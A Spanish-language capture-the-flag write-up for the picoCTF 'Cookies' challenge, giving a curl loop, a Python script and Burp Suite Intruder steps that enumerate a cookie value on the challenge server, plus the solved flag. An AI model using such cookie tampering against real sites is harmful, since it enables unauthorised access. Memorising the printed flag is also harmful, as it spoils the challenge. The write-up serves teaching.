## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:17781/](http://mercury.picoctf.net:17781/)
## Solución 1
```bash
┌──(armando㉿kali)-[~]
└─$ for i in {0..30}; do curl -s http://mercury.picoctf.net:17781/check -H "Cookie: name=$i"; done | grep "picoCTF{"
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>
^C

┌──(armando㉿kali)-[~]
└─$ 
```

## Solución 2
- Creamos un código de Python para que vaya cambiando el valor de la cookie y así para tratar de encontrar la bandera y lo ejecutamos.
```bash
┌──(armando㉿kali)-[~]
└─$ nano cookie.py 
```
```python
import requests
import re

url = "http://mercury.picoctf.net:17781/check"

for i in range(20):
        print(i)
        cookies = {'name':f'{i}'}
        r = requests.get(url, cookies=cookies)
        if 'picoCTF{' in r.text:
                flag = re.findall('picoCTF\\{.*?\\}',r.text)
                print(flag)
```
```bash
┌──(armando㉿kali)-[~]
└─$ python cookie.py
0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
['picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}']
19
20
┌──(armando㉿kali)-[~]
└─$
```

## Solución 3
- Entramos a la herramienta `Burpsuite`, prendemos nuestra proxy, enviamos un valor de prueba, nos dirigimos a la sección de Proxy enviamos el request a la parte de Intruder, seleccionamos el valor que tiene la sentencia `Cookie: name=0` y le damos clic a la opción de `Add`, despues nos vamos a la sección de Payloads seleccionamos el tipo por Numérico y marcamos el origen y el final para el rango, despues damos clic a `Start Attack` y ahí buscamos la bandera en la sección de respuesta.
```bash
picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}
```

## Notas Adicionales
## Referencias